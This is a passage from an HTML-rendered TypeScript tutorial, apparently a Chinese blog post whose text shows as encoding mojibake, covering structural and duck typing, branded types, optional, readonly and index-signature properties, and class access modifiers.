class="hljs-attr">gender</span>: <span class="hljs-string">&quot;male&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-attr">p2</span>: <span class="hljs-title class_">Person</span> = obj; <span class="hljs-comment">// âœ… å…¼å®¹ï¼ˆç»“æ„æ»¡è¶³æ ¸å¿ƒå±æ€§ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>é¸­å­ç±»å‹å®æˆ˜åœºæ™¯</strong></p><p>åœºæ™¯1ï¼šå‡½æ•°å‚æ•°å…¼å®¹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Loggable</span> &#123;<br>  <span class="hljs-attr">log</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsoleLogger</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Logging...&quot;</span>) &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileLogger</span> &#123;<br>  <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123; fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&quot;log.txt&quot;</span>, <span class="hljs-string">&quot;...&quot;</span>) &#125;<br>&#125;<br><br><span class="hljs-comment">// æ¥å—ä»»ä½•å…·æœ‰logæ–¹æ³•çš„å¯¹è±¡</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logOutput</span>(<span class="hljs-params"><span class="hljs-attr">logger</span>: <span class="hljs-title class_">Loggable</span></span>) &#123;<br>  logger.<span class="hljs-title function_">log</span>();<br>&#125;<br><br><span class="hljs-title function_">logOutput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsoleLogger</span>()); <span class="hljs-comment">// âœ…</span><br><span class="hljs-title function_">logOutput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileLogger</span>());    <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šAPIå“åº”å¤„ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ApiResponse</span> &#123;<br>  <span class="hljs-attr">data</span>: <span class="hljs-built_in">unknown</span>;<br>  <span class="hljs-attr">status</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// æ— éœ€å¼ºåˆ¶è½¬æ¢ï¼Œåªè¦ç»“æ„åŒ¹é…</span><br><span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchAPI</span>();<br><span class="hljs-title function_">processResponse</span>(response); <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processResponse</span>(<span class="hljs-params"><span class="hljs-attr">res</span>: <span class="hljs-title class_">ApiResponse</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (res.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) &#123;<br>    <span class="hljs-title function_">parseData</span>(res.<span class="hljs-property">data</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»“æ„åŒ–ç±»å‹çš„è¾¹ç•Œæ§åˆ¶</strong></p><p>(1) ç²¾ç¡®ç±»å‹æ§åˆ¶ï¼ˆé¿å…æ„å¤–åŒ¹é…ï¼‰</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä½¿ç”¨ç‹¬ç‰¹æ ‡è¯†é˜²æ­¢ç»“æ„è¯¯åŒ¹é…</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">_type</span>: <span class="hljs-string">&quot;user&quot;</span>; <span class="hljs-comment">// å”¯ä¸€æ ‡è¯†</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> &#123;<br>  <span class="hljs-attr">_type</span>: <span class="hljs-string">&quot;admin&quot;</span>; <span class="hljs-comment">// å”¯ä¸€æ ‡è¯†</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">privileges</span>: <span class="hljs-built_in">string</span>[];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleEntity</span>(<span class="hljs-params"><span class="hljs-attr">entity</span>: <span class="hljs-title class_">User</span> | <span class="hljs-title class_">Admin</span></span>) &#123;<br>  <span class="hljs-keyword">if</span> (entity.<span class="hljs-property">_type</span> === <span class="hljs-string">&quot;user&quot;</span>) &#123;<br>    <span class="hljs-comment">// å®‰å…¨æ”¶çª„åˆ°Userç±»å‹</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) å¯é€‰å±æ€§ä¸æœªçŸ¥å±æ€§å¤„ç†</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-attr">debug</span>?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// å¯é€‰å±æ€§</span><br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// å…è®¸æœªçŸ¥å±æ€§</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Config</span> = &#123;<br>  <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,<br>  <span class="hljs-attr">height</span>: <span class="hljs-number">200</span>,<br>  <span class="hljs-attr">color</span>: <span class="hljs-string">&quot;blue&quot;</span> <span class="hljs-comment">// âœ… å…è®¸é¢å¤–å±æ€§ï¼ˆå› ç´¢å¼•ç­¾åå­˜åœ¨ï¼‰</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>ä¸åä¹‰ç±»å‹ç³»ç»Ÿçš„äº’æ“ä½œ</strong></p><p>æ¨¡æ‹Ÿåä¹‰ç±»å‹ï¼ˆé€šè¿‡äº¤å‰ç±»å‹ï¼‰ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åˆ›å»ºåä¹‰ç±»å‹æ ‡è®°</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">UserID</span> = <span class="hljs-built_in">string</span> &amp; &#123; <span class="hljs-attr">__brand</span>: <span class="hljs-string">&quot;UserID&quot;</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">OrderID</span> = <span class="hljs-built_in">string</span> &amp; &#123; <span class="hljs-attr">__brand</span>: <span class="hljs-string">&quot;OrderID&quot;</span> &#125;;<br><br><span class="hljs-comment">// ç±»å‹åˆ›å»ºå‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createUserID</span>(<span class="hljs-params"><span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">UserID</span> &#123;<br>  <span class="hljs-keyword">return</span> id <span class="hljs-keyword">as</span> <span class="hljs-title class_">UserID</span>;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">userId</span>: <span class="hljs-title class_">UserID</span> = <span class="hljs-title function_">createUserID</span>(<span class="hljs-string">&quot;user-123&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-attr">orderId</span>: <span class="hljs-title class_">OrderID</span> = <span class="hljs-string">&quot;order-456&quot;</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">OrderID</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getUser</span>(<span class="hljs-params"><span class="hljs-attr">id</span>: <span class="hljs-title class_">UserID</span></span>) &#123;...&#125;<br><br><span class="hljs-title function_">getUser</span>(userId); <span class="hljs-comment">// âœ…</span><br><span class="hljs-title function_">getUser</span>(orderId); <span class="hljs-comment">// ğŸš« ç¼–è¯‘é”™è¯¯ï¼šç±»å‹ä¸å…¼å®¹</span><br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>ä¼˜å…ˆä½¿ç”¨æ¥å£è€Œéç±»ï¼šæ¥å£æ›´ç¬¦åˆç»“æ„åŒ–ç±»å‹å“²å­¦ï¼ˆè½»é‡çº§å¥‘çº¦ï¼‰</li><li>é¿å…è¿‡åº¦åŒ¹é…é—®é¢˜ï¼šé€šè¿‡æœ€å°åŒ–æ¥å£å±æ€§å‡å°‘æ„å¤–å…¼å®¹</li><li>åˆ©ç”¨ç±»å‹æ¨å¯¼ä¼˜åŠ¿ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è‡ªåŠ¨æ¨å¯¼è¿”å›ç±»å‹ç¬¦åˆç»“æ„</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createPoint</span>(<span class="hljs-params"><span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span></span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123; x, y, <span class="hljs-attr">z</span>: <span class="hljs-number">0</span> &#125;; <span class="hljs-comment">// è‡ªåŠ¨å…¼å®¹ Vector2D</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>é¸­å­ç±»å‹æµ‹è¯•ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¿è¡Œæ—¶éªŒè¯å¯¹è±¡æ˜¯å¦æ»¡è¶³ç»“æ„</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isVector2D</span>(<span class="hljs-params"><span class="hljs-attr">obj</span>: <span class="hljs-built_in">any</span></span>): obj is <span class="hljs-title class_">Vector2D</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;x&quot;</span> <span class="hljs-keyword">in</span> obj &amp;&amp; <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-æ¥å£ä¸é¢å‘å¯¹è±¡"><a href="#1-2-æ¥å£ä¸é¢å‘å¯¹è±¡" class="headerlink" title="1.2 æ¥å£ä¸é¢å‘å¯¹è±¡"></a>1.2 æ¥å£ä¸é¢å‘å¯¹è±¡</h2><h3 id="1-2-1-æ¥å£é«˜çº§ç‰¹æ€§ï¼ˆå¯é€‰å±æ€§ã€åªè¯»å±æ€§ã€ç´¢å¼•ç­¾åï¼‰"><a href="#1-2-1-æ¥å£é«˜çº§ç‰¹æ€§ï¼ˆå¯é€‰å±æ€§ã€åªè¯»å±æ€§ã€ç´¢å¼•ç­¾åï¼‰" class="headerlink" title="1.2.1 æ¥å£é«˜çº§ç‰¹æ€§ï¼ˆå¯é€‰å±æ€§ã€åªè¯»å±æ€§ã€ç´¢å¼•ç­¾åï¼‰"></a>1.2.1 æ¥å£é«˜çº§ç‰¹æ€§ï¼ˆå¯é€‰å±æ€§ã€åªè¯»å±æ€§ã€ç´¢å¼•ç­¾åï¼‰</h3><p><strong>å¯é€‰å±æ€§ï¼ˆOptional Propertiesï¼‰</strong></p><p>è¯­æ³•ï¼šåœ¨å±æ€§ååæ·»åŠ  ?</p><p>ä½œç”¨ï¼šå…è®¸å¯¹è±¡ç¼ºå°‘è¯¥å±æ€§</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserProfile</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>?: <span class="hljs-built_in">number</span>;  <span class="hljs-comment">// å¯é€‰å±æ€§</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">user1</span>: <span class="hljs-title class_">UserProfile</span> = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span> &#125;;          <span class="hljs-comment">// âœ… age å¯çœç•¥</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">user2</span>: <span class="hljs-title class_">UserProfile</span> = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;  <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ—¶æ£€æŸ¥ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-keyword">in</span> user1) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-property">age</span>.<span class="hljs-title function_">toFixed</span>()); <span class="hljs-comment">// å®‰å…¨è®¿é—®</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åªè¯»å±æ€§ï¼ˆReadonly Propertiesï¼‰</strong></p><p>è¯­æ³•ï¼šä½¿ç”¨ readonly ä¿®é¥°ç¬¦</p><p>ä½œç”¨ï¼šåˆå§‹åŒ–åç¦æ­¢ä¿®æ”¹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">apiKey</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">endpoint</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">Config</span> = &#123;<br>  <span class="hljs-attr">apiKey</span>: <span class="hljs-string">&quot;abc123&quot;</span>,<br>  <span class="hljs-attr">endpoint</span>: <span class="hljs-string">&quot;/api&quot;</span><br>&#125;;<br><br>config.<span class="hljs-property">endpoint</span> = <span class="hljs-string">&quot;/new&quot;</span>; <span class="hljs-comment">// âœ… å…è®¸ä¿®æ”¹</span><br>config.<span class="hljs-property">apiKey</span> = <span class="hljs-string">&quot;xyz&quot;</span>;    <span class="hljs-comment">// ğŸš« ç¼–è¯‘é”™è¯¯ï¼šåªè¯»å±æ€§</span><br></code></pre></td></tr></table></figure><p>ç‰¹æ®Šåœºæ™¯ - åªè¯»æ•°ç»„ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ImmutableData</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">tags</span>: <span class="hljs-built_in">string</span>[];<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: <span class="hljs-title class_">ImmutableData</span> = &#123; <span class="hljs-attr">tags</span>: [<span class="hljs-string">&quot;frontend&quot;</span>, <span class="hljs-string">&quot;react&quot;</span>] &#125;;<br>data.<span class="hljs-property">tags</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;typescript&quot;</span>); <span class="hljs-comment">// âœ… å…è®¸ï¼ˆæ•°ç»„å¼•ç”¨æœªå˜ï¼‰</span><br>data.<span class="hljs-property">tags</span> = [<span class="hljs-string">&quot;new&quot;</span>];         <span class="hljs-comment">// ğŸš« ç¦æ­¢é‡æ–°èµ‹å€¼</span><br></code></pre></td></tr></table></figure><p><strong>ç´¢å¼•ç­¾åï¼ˆIndex Signaturesï¼‰</strong></p><p>è¯­æ³•ï¼š[key: KeyType]: ValueType</p><p>ä½œç”¨ï¼šå®šä¹‰åŠ¨æ€å±æ€§å</p><p>åŸºç¡€ç”¨æ³•ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">StringMap</span> &#123;<br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// å…è®¸ä»»æ„å­—ç¬¦ä¸²å±æ€§å</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">scores</span>: <span class="hljs-title class_">StringMap</span> = &#123;<br>  <span class="hljs-attr">math</span>: <span class="hljs-number">95</span>,<br>  <span class="hljs-attr">science</span>: <span class="hljs-number">90</span><br>&#125;;<br>scores[<span class="hljs-string">&quot;english&quot;</span>] = <span class="hljs-number">88</span>; <span class="hljs-comment">// âœ… åŠ¨æ€æ·»åŠ </span><br></code></pre></td></tr></table></figure><p>æ··åˆä½¿ç”¨ï¼ˆå›ºå®šå±æ€§ + ç´¢å¼•ç­¾åï¼‰ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">HybridInterface</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;          <span class="hljs-comment">// å›ºå®šå±æ€§</span><br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;  <span class="hljs-comment">// åŠ¨æ€å±æ€§</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">HybridInterface</span> = &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-attr">tempData</span>: &#123; <span class="hljs-comment">/*...*/</span> &#125;, <span class="hljs-comment">// âœ… åŠ¨æ€å±æ€§</span><br>  <span class="hljs-attr">count</span>: <span class="hljs-number">10</span>             <span class="hljs-comment">// âœ…</span><br>&#125;;<br>obj.<span class="hljs-property">id</span> = <span class="hljs-string">&quot;456&quot;</span>;         <span class="hljs-comment">// âœ… å›ºå®šå±æ€§å¯ä¿®æ”¹</span><br></code></pre></td></tr></table></figure><p>ç´¢å¼•ç±»å‹é™åˆ¶ï¼š</p><table><thead><tr><th align="left">ç´¢å¼•ç±»å‹</th><th align="left">ç¤ºä¾‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">string</td><td align="left">[key: string]: T</td><td align="left">æ”¯æŒæ‰€æœ‰å­—ç¬¦ä¸²é”®</td></tr><tr><td align="left">number</td><td align="left">[index: number]: T</td><td align="left">æ•°ç»„å¼è®¿é—®ï¼ˆå®é™…é”®ä»ä¸ºå­—ç¬¦ä¸²ï¼‰</td></tr><tr><td align="left">symbol</td><td align="left">[sym: symbol]: T</td><td align="left">ES6 Symbol é”®</td></tr><tr><td align="left">æ¨¡æ¿å­—é¢é‡</td><td align="left">[key: test_${string}]: T</td><td align="left">TS 4.4+ æ¨¡å¼åŒ¹é…</td></tr></tbody></table><p><strong>é«˜çº§ç»„åˆåº”ç”¨</strong></p><p>åœºæ™¯ï¼šé…ç½®å¯¹è±¡</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AppConfig</span> &#123;<br>  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;   <span class="hljs-comment">// åªè¯»ç‰ˆæœ¬å·</span><br>  <span class="hljs-attr">env</span>?: <span class="hljs-string">&quot;dev&quot;</span> | <span class="hljs-string">&quot;prod&quot;</span>;       <span class="hljs-comment">// å¯é€‰ç¯å¢ƒ</span><br>  [<span class="hljs-attr">option</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">unknown</span>;  <span class="hljs-comment">// å…¶ä»–åŠ¨æ€é…ç½®</span><br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">AppConfig</span> = &#123;<br>  <span class="hljs-attr">version</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,<br>  <span class="hljs-attr">debug</span>: <span class="hljs-literal">true</span>,       <span class="hljs-comment">// âœ… åŠ¨æ€å±æ€§</span><br>  <span class="hljs-attr">maxRetries</span>: <span class="hljs-number">3</span>      <span class="hljs-comment">// âœ…</span><br>&#125;;<br><br>config.<span class="hljs-property">version</span> = <span class="hljs-string">&quot;2.0&quot;</span>; <span class="hljs-comment">// ğŸš« ç¦æ­¢ä¿®æ”¹åªè¯»å±æ€§</span><br></code></pre></td></tr></table></figure><p>ç´¢å¼•ç­¾åç±»å‹çº¦æŸï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è¦æ±‚æ‰€æœ‰å±æ€§å€¼ç±»å‹å…¼å®¹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConsistentValues</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;      <span class="hljs-comment">// âœ… å…¼å®¹ string | number</span><br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼ˆç±»å‹å†²çªï¼‰</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Invalid</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">boolean</span>;       <span class="hljs-comment">// ğŸš« ä¸ç´¢å¼•ç­¾åç±»å‹ä¸å…¼å®¹</span><br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹å®è·µè¦ç‚¹</strong></p><ol><li>ä¼˜å…ˆæ˜¾å¼å£°æ˜é‡è¦å±æ€§ï¼šé¿å…è¿‡åº¦ä¾èµ–ç´¢å¼•ç­¾å</li><li>åªè¯»å±æ€§ç”¨äºä¸å˜æ•°æ®ï¼šå¦‚é…ç½®IDã€ç‰ˆæœ¬å·ç­‰</li><li>å¯é€‰å±æ€§æ›¿ä»£ç©ºå€¼ï¼šæ¯” property: null æ›´è¯­ä¹‰åŒ–</li><li>ç´¢å¼•ç­¾åè¾¹ç•Œæ§åˆ¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç²¾ç¡®æ§åˆ¶åŠ¨æ€å±æ€§ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">SafeDynamic</span> &#123;<br>  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">string</span> | <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// å¿…é¡»æ˜¾å¼æ£€æŸ¥</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getValue</span>(<span class="hljs-params"><span class="hljs-attr">obj</span>: <span class="hljs-title class_">SafeDynamic</span>, <span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> value = obj[key];<br>  <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Missing property&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> value; <span class="hljs-comment">// æ­¤æ—¶ç±»å‹æ”¶çª„ä¸º string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-2-ç±»ç»§æ‰¿ä½“ç³»ä¸è®¿é—®ä¿®é¥°ç¬¦"><a href="#1-2-2-ç±»ç»§æ‰¿ä½“ç³»ä¸è®¿é—®ä¿®é¥°ç¬¦" class="headerlink" title="1.2.2 ç±»ç»§æ‰¿ä½“ç³»ä¸è®¿é—®ä¿®é¥°ç¬¦"></a>1.2.2 ç±»ç»§æ‰¿ä½“ç³»ä¸è®¿é—®ä¿®é¥°ç¬¦</h3><p><strong>è®¿é—®ä¿®é¥°ç¬¦ï¼ˆAccess Modifiersï¼‰</strong></p><p>æ§åˆ¶ç±»æˆå‘˜çš„å¯è®¿é—®æ€§ï¼š</p><table><thead><tr><th align="left">ä¿®é¥°ç¬¦</th><th align="left">ç±»å†…éƒ¨</th><th align="left">å­ç±»</th><th align="left">ç±»å®ä¾‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">public</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">é»˜è®¤ä¿®é¥°ç¬¦ï¼ˆå¯çœç•¥ï¼‰</td></tr><tr><td align="left">protected</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">ä»…ç±»å†…éƒ¨å’Œå­ç±»è®¿é—®</td></tr><tr><td align="left">private</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">âŒ</td><td align="left">ä»…ç±»å†…éƒ¨è®¿é—®</td></tr><tr><td align="left">#field</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">âŒ</td><td align="left">ES2022 